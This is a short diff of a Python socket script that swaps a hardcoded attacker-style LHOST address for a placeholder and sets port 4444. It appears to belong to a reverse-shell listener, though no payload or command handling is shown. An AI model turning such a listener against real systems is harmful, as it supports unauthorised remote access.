@@ -4,7 +4,7 @@ import sys
 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("Socket created...")
 
-LHOST = "10.22.225.106"
+LHOST = "YOUR IP ADDRESS"
 LPORT = 4444
 
 try:
@@ -36,4 +36,5 @@ except KeyboardInterrupt as k:
     print(f"Connection ended due to {k}")
 
 client_socket.close()
+
 sk.close()
